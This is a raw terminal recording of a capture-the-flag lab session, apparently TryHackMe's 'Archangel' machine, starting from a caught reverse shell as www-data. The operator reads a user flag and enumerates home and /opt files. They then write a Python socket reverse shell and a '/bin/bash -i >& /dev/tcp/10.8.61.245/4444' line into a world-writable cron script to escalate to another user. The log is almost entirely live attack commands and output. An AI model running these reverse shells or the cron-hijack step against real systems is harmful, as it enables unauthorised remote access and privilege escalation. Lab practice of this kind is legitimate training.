@@ -1,0 +1,201 @@
+Script started on 2025-04-10 10:12:48+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 2050
+bash: cannot set terminal process group (514): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/html/development_testing$ [Kwww-data@ubuntu:/var/www/html/development_testing$ [K[?2004hwww-data@ubuntu:/var/www/html/development_testing$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kindex.html
+mrrobot.php
+robots.txt
+test.php
+www-data@ubuntu:/var/www/html/development_testing$ [Kwww-data@ubuntu:/var/www/html/development_testing$ [K[?2004hwww-data@ubuntu:/var/www/html/development_testing$ cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home
+www-data@ubuntu:/home$ [Kwww-data@ubuntu:/home$ [K[?2004hwww-data@ubuntu:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Karchangel
+www-data@ubuntu:/home$ [Kwww-data@ubuntu:/home$ [K[?2004hwww-data@ubuntu:/home$ cd ar    [Kchangel[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd archangel
+[Kcd archangel
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kmyfiles
+secret
+user.txt
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ cat user.txr[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user.txr
+[Kcat user.txr
+[Kcat: user.txr: No such file or directory
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ cat user.txr[Kt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user.txt
+[Kcat user.txt
+[Kthm{lf1_t0_rc3_1s_tr1cky}
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ [7mfind / -user archangel -type f 2>/dev/null | grep -v /proc[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfind / -user archangel -type f 2>/dev/null | grep -v /proc
+[K<-user archangel -type f 2>/dev/null | grep -v /proc
+[K/opt/helloworld.sh
+/home/archangel/.selected_editor
+/home/archangel/.profile
+/home/archangel/user.txt
+/home/archangel/.bash_logout
+/home/archangel/.bashrc
+[Kwww-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al
+[Ktotal 44
+drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
+drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
+-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
+-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
+drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
+drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
+-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
+-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
+drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
+drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
+-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ ls secret[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls secret
+[Kls secret
+[Kls: cannot open directory 'secret': Permission denied
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ ls myfiles[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls myfiles
+[Kls myfiles
+[Kpasswordbackup
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ cd myfiles[K[K[K[K[K[K[K[K[K[Kcat myfiles/pas        [Kswordbacup[K[Kkup[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat myfiles/passwordbackup
+[Kcat myfiles/passwordbackup
+[Khttps://www.youtube.com/watch?v=dQw4w9WgXcQ
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ ls -l [7m/opt/helloworld.sh[27m[7mls -l [27m/opt/helloworld.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l /opt/helloworld.sh
+[Kls -l /opt/helloworld.sh
+[K-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ cat [7m/opt/helloworld.sh[27m[7mcat [27m/opt/helloworld.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /opt/helloworld.sh
+[Kcat /opt/helloworld.sh
+[K#!/bin/bash
+echo "hello world" >> /opt/backupfiles/helloworld.txt
+www-data@ubuntu:/home/archangel$ [Kwww-data@ubuntu:/home/archangel$ [K[?2004hwww-data@ubuntu:/home/archangel$ cd /opt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /opt
+[Kcd /opt
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kbackupfiles
+helloworld.sh
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l
+[Ktotal 8
+drwxrwx--- 2 archangel archangel 4096 Nov 20  2020 backupfiles
+-rwxrwxrwx 1 archangel archangel   66 Nov 20  2020 helloworld.sh
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ ls backupfiles[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls backupfiles
+[Kls backupfiles
+[Kls: cannot open directory 'backupfiles': Permission denied
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ whereis python3[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhereis python3
+[Kwhereis python3
+[Kpython3: /usr/bin/python3 /usr/bin/python3.6 /usr/bin/python3.6m /usr/lib/python3.8 /usr/lib/python3 /usr/lib/python3.7 /usr/lib/python3.6 /etc/python3 /etc/python3.6 /usr/local/lib/python3.6 /usr/share/python3 /usr/share/man/man1/python3.1.gz
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ echo '[7m#!/usr/bin/python3[27m#!/usr/bin/python3' > reverse.py[K[K[K[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho '#!/usr/bin/python3' > reverse
+[Kecho '#!/usr/bin/python3' > reverse
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kbackupfiles
+helloworld.sh
+reverse
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ cat reverse[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat reverse
+[Kcat reverse
+[K#!/usr/bin/python3
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ echo ''[7mpython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.61.245",[27m[7m4[27m[7m444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'[27m'[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.61.245",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")''[C[C[C[C[C[C[C[C[C[C\''[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C\'import os,pty,socket;s=socket.socket();s.connect(("10.8.61.245",[C[C[C[1@4[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C >> reverse[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("10.8.61.245",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'' >> reverse
+[K<r f in(0,1,2)];pty.spawn("/bin/bash")\'' >> reverse
+bash: syntax error near unexpected token `('
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ rm reverse[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm reverse
+[Krm reverse
+[Kwww-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ > reverse[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h> reverse
+[K> reverse
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kbackupfiles
+helloworld.sh
+reverse
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ rm reverse[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hrm reverse
+[Krm reverse
+[Kwww-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ [7mecho '#!/usr/bin/python3' > reverse[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho '#!/usr/bin/python3' > reverse
+[Kecho '#!/usr/bin/python3' > reverse
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ [7mecho 'import os,pty,socket;s=socket.socket();s.connect(("10.8.61.245",4444));[os.d[27m[7mu[27m[7mp2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")' >> reverse[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho 'import os,pty,socket;s=socket.socket();s.connect(("10.8.61.245",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")' >> reverse[A[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho 'import os,pty,socket;s=socket.socket();s.connect(("10.8.61.245",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")' >> reverse
+[K<or f in (0,1,2)];pty.spawn("/bin/bash")' >> reverse
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ chmod +x reverse[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hchmod +x reverse
+[Kchmod +x reverse
+[Kwww-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ sudo -u archangel ./reverse[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u archangel ./reverse
+[Ksudo -u archangel ./reverse
+[Ksudo: no tty present and no askpass program specified
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+[Ksudo: no tty present and no askpass program specified
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ [7mpython3 -c 'import pty; pty.spawn("sudo -u archangel ./reverse")'[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hpython3 -c 'import pty; pty.spawn("sudo -u archangel ./reverse")'
+[K<port pty; pty.spawn("sudo -u archangel ./reverse")'
+[KTraceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/usr/lib/python3.6/pty.py", line 156, in spawn
+    os.execlp(argv[0], *argv)
+  File "/usr/lib/python3.6/os.py", line 542, in execlp
+    execvp(file, args)
+  File "/usr/lib/python3.6/os.py", line 559, in execvp
+    _execvpe(file, args)
+  File "/usr/lib/python3.6/os.py", line 583, in _execvpe
+    exec_func(file, *argrest)
+FileNotFoundError: [Errno 2] No such file or directory
+[Kwww-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ [7mscript -qc 'sudo -u archangel ./reverse'[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hscript -qc 'sudo -u archangel ./reverse'
+[Kscript -qc 'sudo -u archangel ./reverse'
+[K[sudo] password for www-data: [K[sudo] password for www-data: [K[?2004h[sudo] password for www-data: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.[KSorry, try again.[KSorry, try again.
+[sudo] password for www-data: [K[sudo] password for www-data: [K[?2004h[sudo] password for www-data: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.[KSorry, try again.[KSorry, try again.
+[sudo] password for www-data: [K[sudo] password for www-data: [K[?2004h[sudo] password for www-data: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Ksudo[Ksudo[Ksudo: 3 incorrect password attempts
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l
+[Ktotal 16
+drwxrwx--- 2 archangel archangel 4096 Nov 20  2020 backupfiles
+-rwxrwxrwx 1 archangel archangel   66 Nov 20  2020 helloworld.sh
+-rwxr-xr-x 1 www-data  www-data   154 Apr 10 12:54 reverse
+-rw-r--r-- 1 www-data  www-data   255 Apr 10 12:56 typescript
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ echo '#![Kwhich bash[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich bash
+[Kwhich bash
+[K/bin/bash
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ echo '#!/bin/bash' > helloworld.Sh[K[Ksh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho '#!/bin/bash' > helloworld.sh
+[Kecho '#!/bin/bash' > helloworld.sh
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ echo '[7m/bin/bash -i >& /dev/tcp/10.8.61.245/4444 0>&1[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/bin/bash -i >& /dev/tcp/10.8.61.245/4444 0>&1' >> helloworld.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hecho '/bin/bash -i >& /dev/tcp/10.8.61.245/4444 0>&1' >> helloworld.sh
+[K<>& /dev/tcp/10.8.61.245/4444 0>&1' >> helloworld.sh
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kbackupfiles
+helloworld.sh
+reverse
+typescript
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l
+[Ktotal 16
+drwxrwx--- 2 archangel archangel 4096 Nov 20  2020 backupfiles
+-rwxrwxrwx 1 archangel archangel   59 Apr 10 12:57 helloworld.sh
+-rwxr-xr-x 1 www-data  www-data   154 Apr 10 12:54 reverse
+-rw-r--r-- 1 www-data  www-data   255 Apr 10 12:56 typescript
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ sudo -u archangel ./helloworld.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u archangel ./helloworld.sh
+[Ksudo -u archangel ./helloworld.sh
+[Ksudo: no tty present and no askpass program specified
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ cat /etc/crontab[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /etc/crontab
+[Kcat /etc/crontab
+[K# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+*/1 *   * * *   archangel /opt/helloworld.sh
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+www-data@ubuntu:/opt$ [Kwww-data@ubuntu:/opt$ [K[?2004hwww-data@ubuntu:/opt$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[?2004l
+Script done on 2025-04-10 10:35:24+03:00 [COMMAND_EXIT_CODE="0"]
